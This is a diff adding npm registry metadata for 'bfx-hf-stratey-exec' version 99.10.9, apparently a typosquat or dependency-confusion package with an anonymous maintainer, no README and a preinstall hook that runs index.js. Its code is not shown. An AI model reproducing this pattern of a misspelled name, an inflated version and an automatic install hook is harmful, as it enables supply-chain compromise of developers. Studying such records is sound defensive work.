@@ -1,0 +1,62 @@
+{
+    "_id": "bfx-hf-stratey-exec",
+    "name": "bfx-hf-stratey-exec",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "bfx-hf-stratey-exec",
+            "version": "99.10.9",
+            "description": "azbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "bfx-hf-stratey-exec@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-g3A5nnwsGuVxKgLnCAq+JVf39stPVeHuvdwVFUnF7tsLnywU4nWpq0+xDZ04r1za0XkR89RFB+1Q3vZxltQfKA==",
+                "shasum": "8304a8fa9e939e78b81266d14843a4f3ceac702f",
+                "tarball": "https://registry.npmjs.org/bfx-hf-stratey-exec/-/bfx-hf-stratey-exec-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5071,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPJ5mACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoLQg//evCzXri3flxKODbpQTLybley94vGvXxkehwCxt+zL99Qbitv\r\nUNoAqGVZU9KGYqozXnQ+VTauTcp3at7E8lV0Kogk+u0O5N/gSyV2Xb48KlUk\r\nd7CEj/5ZzgCDPx2KSSA8sdh1OEJmuXCI8tgKzOLVQ2HNng6Sow8016AyNd5E\r\nNYF0sL567MM8Cl4IA5j2/4/4ipuoCOj3ES/z8lrUSK8pFSnj4iWYQ5v3WziZ\r\nMzEB7Ia0tU1TJeuee8xMvIjnGSSyEBg0oJ6AsKuKINhlfQ21xrBFHlgZXzlx\r\nNUgfsbQtHL2ldpERCs4UOdPZLyF6c5xYOGkWopjTIBKHCqm9bCDYAahADF7V\r\nC91u6EPd84radZ4L03PUP1pVNKHEKA46X3TRiTpODjwHufil5jH6BJPXE26J\r\nQodGE24mdAPGphw1hWh9rTraKdRyovK8be+r14aU7MIk2IJIp1lnwSKG3GUQ\r\nyiaziyFOL3zXUiPgce6UDIRvCPYXH1Rl9WueOXLT3wCDJ89HtegFCNv74k7W\r\nPDrvugiS4MT2yCz3MhoVquqikJ06gVZ8d+eAAsY0oPcnXF9zCW1rBoAchGD4\r\nxNsSxA4+QOOODiEDZq6oFqkyt9aDt/S4SlTC0LxtqWF2p3TyS9QbRqMhfdSZ\r\nPC5UwGmSBmBBAXhJ4fbvQTx5CeYo7pP1a3Y=\r\n=IW/b\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "efc1r8dr",
+                "email": "efc1r8dr@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "efc1r8dr",
+                    "email": "efc1r8dr@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/bfx-hf-stratey-exec_99.10.9_1648139878714_0.2915043771126471"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T16:37:58.714Z",
+        "99.10.9": "2022-03-24T16:37:58.830Z",
+        "modified": "2022-03-24T16:37:58.955Z"
+    },
+    "maintainers": [
+        {
+            "name": "efc1r8dr",
+            "email": "efc1r8dr@rt11.ml"
+        }
+    ],
+    "description": "azbit package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
